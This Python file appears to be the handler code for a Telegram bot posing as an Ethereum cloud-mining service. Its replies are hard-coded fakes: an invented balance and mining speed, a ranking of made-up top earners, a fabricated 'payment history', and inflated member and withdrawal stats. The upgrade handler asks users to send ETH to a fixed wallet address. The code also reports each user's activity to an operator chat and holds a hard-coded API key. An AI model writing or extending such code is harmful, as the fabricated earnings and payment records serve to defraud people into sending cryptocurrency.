# -*- coding: utf-8 -*-
import re
import requests
#from prompt_toolkit import HTML
import config
import json
import webbrowser
import urllib.request
import requests
#URL = 'http://127.0.0.1:5000/api/v1/plans'
#URL = 'https://api.telegram.org/bot'+(config.TOKEN)+'/sendMessage?chat_id='+(config.CHAT)+'&text=Hello+bot'
def handle_account_request(id,name):
  u_name = name
  url1 = "http://127.0.0.1:5000/api/v1/users"
  payload= json.dumps({
          "name": f"{ u_name }",
          "telegram_user_id": f"{ id }",
          "email_id": ""
          })

  headers = {
    'API-Key': '65553183-4dff-42ee-ad2b-4edd15b38113',
    'telegram_user_id': f"{ id }",
    'Content-Type': 'application/json'
        }

  response = requests.request("POST", url1, headers=headers, data=payload)

  # u_name1 = ("\033[1m" +{name}+ "\033[0m")
  # print(u_name1)
  print(response.text)
  account_detail = f"GENERAL INFORMATION \n \
                     \n \
    User:{ u_name }\n \
    Balance: 0.01922000 ETH \n \
                    \n \
    Plan: Free \n \
    ⚡️ Speed: 300 MH/s \n \
             0.01440000 ETH/day \n \
             0.43200000 ETH/month \n \
                    \n \
    ETH wallet: \n \
                    \n \
    /Update_Wallet\n \
                    \n \
    Email:\n \
                    \n \
    /Update_Email "

  #webbrowser.open(URL,2, False)
  # driver = webdriver.PhantomJS("./phantomjs") # path to phantomjs binary
  # driver.get(URL)
  # ## refer https://pypi.python.org/pypi/selenium
  text = 'User:'+u_name+' views his/her account details' 
  URL = 'https://api.telegram.org/bot'+(config.TOKEN)+'/sendMessage?chat_id='+(config.CHAT)+'&text='+text+''
  url = URL.replace(" ","%20")
  urllib.request.urlopen(url)
  return account_detail

def handle_referals_request(id,name):
  u_name = name
  referal_code ="5656565"
  #result = '<b>' + 'Referrals code' + ' -> ' + referal_code + ':</b>\n\n'
  result = f"👥 REFERRAL SYSTEM \n \
                     \n \
    ▫️ Earnings: 0.00000000 ETH\n \
    ▫️ Referrals: 0 \n \
                    \n \
    ▫️ Active Referrals: 0 \n \
    ▫️ Commission: 10% of referrals earnings. \n \
                    \n \
    ▫️ Bonus: 0.00500000 ETH for every referrals. \n \
                    \n \
    ▫️ Link: https://t.me/ETH_Miner_us_bot?start="+str(referal_code)+"\n "
  text = 'User:'+u_name+' with referal code:'+referal_code+' views his/her referal statement' 
  URL = 'https://api.telegram.org/bot'+(config.TOKEN)+'/sendMessage?chat_id='+(config.CHAT)+'&text='+text+''
  url = URL.replace(" ","%20")
  urllib.request.urlopen(url)
  return result

def handle_withdraw_request(id,name):
  u_name = name
  #result = '<b>' + 'Withdraw' + ' -> '  ':</b>\n\n'
  result = f"💵 WITHDRAW \n \
                     \n \
    ✖️ Minimum withdrawal: 0.25000000 ETH \n \
    ✖️ Update wallet for your account.\n \
    ✖️ Update email for your account.\n \
    ✖️ Refer 10 friends. "
  text = 'User:'+u_name+' views his/her withdraw criteria' 
  URL = 'https://api.telegram.org/bot'+(config.TOKEN)+'/sendMessage?chat_id='+(config.CHAT)+'&text='+text+''
  url = URL.replace(" ","%20")
  urllib.request.urlopen(url)
  return result

def handle_upgrade_request(id,name):
  u_name = name
  url1 = "http://127.0.0.1:5000/api/v1/plans"
  payload={}
  headers = {
    'API-Key': '65553183-4dff-42ee-ad2b-4edd15b38113',
    'telegram_user_id': '{id}'
        }

  response = requests.request("GET", url1, headers=headers, data=payload)
  #print(response.text)
  resp = response.text
  resp_dict = json.loads(resp)
  result1 = f"UPGRADE ACCOUNT \n \
                      "
  plan_list = resp_dict["plan_list"]
  for i in plan_list: 
    result = f" \n\
          🔹 Plan:{i['plan_name']} \n \
          💲 Price:{ i['price'] } ETH \n \
          ⚡️ Speed: 1500 MH/s \n \
                  { i['max_coin_per_day'] } ETH/day \n \
                  { i['max_coin_per_month'] } ETH/month \n \
          💵 Withdrawal: { i['withdrawal'] } hours \n \
          ⌚️ Contract length: { i['contract_length'] }  \n \
                        "
    result1 = result1 + result
  result2 = result1 +"\n\
  ◽️ Please send Ethereum to the address bellow to Upgrade your account:\n \
    \n \
  0x719071dAF5dAEDAF69C849c141880********* \n \
      \n \
  https://etherscan.io/address/0x719071dAF5dAEDAF69C849c141880Dbc64A439b3\n \
      \n \
  ⚠️ Only send Ethereum (ETH) to this address! \n \
    "
  text = 'User:'+u_name+' views Upgrade Plans' 
  URL = 'https://api.telegram.org/bot'+(config.TOKEN)+'/sendMessage?chat_id='+(config.CHAT)+'&text='+text+''
  url = URL.replace(" ","%20")
  urllib.request.urlopen(url)
  return result2

def handle_ranking_request(id, name):
  u_name = name
  result = f"🏆 RANKING\n \
    \n \
    \n \
  🥇 Ibrahima PAFADNAM +746 \n \
  🥈 Junior Nghonyama +633 \n \
  🥉 Charles +618 \n \
  ▫️ Jah +586 \n \
  ▫️ Njagi Susan +556 \n \
  🔹 Son Tran +465 \n \
  ▫️ Yeong Teong Ngo +455 \n \
  🔹 SBW +440 \n \
  ▫️ GURAM KHUTASHVI +413 \n \
  🔹 Vania Silva +412  \n \
    "
  #result = '<b>' + 'Ranking' + ' -> '  ':</b>\n\n'
  text = 'User:'+u_name+' views overall Top 10 Ranking' 
  URL = 'https://api.telegram.org/bot'+(config.TOKEN)+'/sendMessage?chat_id='+(config.CHAT)+'&text='+text+''
  url = URL.replace(" ","%20")
  urllib.request.urlopen(url)
  return result

def handle_payment_request(id, name):
  u_name = name
  result = f"💲 PAYMENT HISTORY\n \
    \n \
✅ 0.32150000 ETH, 04-14 09:27 \n \
🔹 Shu Gy \n \
  \n \
✅ 0.74375800 ETH, 04-14 09:24 \n \
🔹 Elsa \n \
  \n \
✅ 0.33351000 ETH, 04-14 09:24 \n \
🔹 ᎠᎬᏡᎢᎬᏒᏫᏌᏚ \n \
  \n \
✅ 0.35530200 ETH, 04-14 09:22 \n \
🔹 Kaptchouang Sandra \n \
  \n \
✅ 0.26291000 ETH, 04-14 09:19 \n \
🔹 Ezrah Ngetich \n \
  \n \
✅ 0.26540600 ETH, 04-14 09:19 \n \
🔹 SlimKing \n \
  \n \
✅ 0.25552200 ETH, 04-14 09:19 \n \
🔹 T·D \n \
  \n \
✅ 0.38535300 ETH, 04-14 09:17 \n \
🔹 Roger G \n \
  \n \
✅ 0.26401900 ETH, 04-14 09:17 \n \
🔹 *·* \n \
  \n \
✅ 0.25257600 ETH, 04-14 09:16 \n \
🔹 Patrylo Patrylo \n \
  \n \
▫️ Only 10 latest payments are displayed! \n \
  "
  #result = '<b>' + 'Payment' + ' -> ' +  ':</b>\n\n'
  text = 'User:'+u_name+' views Payment requests' 
  URL = 'https://api.telegram.org/bot'+(config.TOKEN)+'/sendMessage?chat_id='+(config.CHAT)+'&text='+text+''
  url = URL.replace(" ","%20")
  urllib.request.urlopen(url)
  return result

def handle_stats_request(id,name):
  u_name = name
  result = f"📈 BOT STATS \n \
    \n \
◽️ Monthly withdraw: 11647.3522 ETH \n \
◽️ Monthly members: 274,104 \n \
◽️ Active members: 136,417 \n \
◽️ Referer: 91,740 \n \
◽️ Online: 2,833 \n \
  "
  #result = '<b>' + 'Stats' + ' -> ' +  ':</b>\n\n'
  text = "User:"+u_name+" views Company's stats"
  URL = 'https://api.telegram.org/bot'+(config.TOKEN)+'/sendMessage?chat_id='+(config.CHAT)+'&text='+text+''
  url = URL.replace(" ","%20")
  urllib.request.urlopen(url)
  return result

def handle_checkin_request(id,name):
  u_name = name
  result = f"📈 Daily Check-in \n \
    "
  text = "User:"+u_name+" just checked-in"
  URL = 'https://api.telegram.org/bot'+(config.TOKEN)+'/sendMessage?chat_id='+(config.CHAT)+'&text='+text+''
  url = URL.replace(" ","%20")
  urllib.request.urlopen(url)
  return result




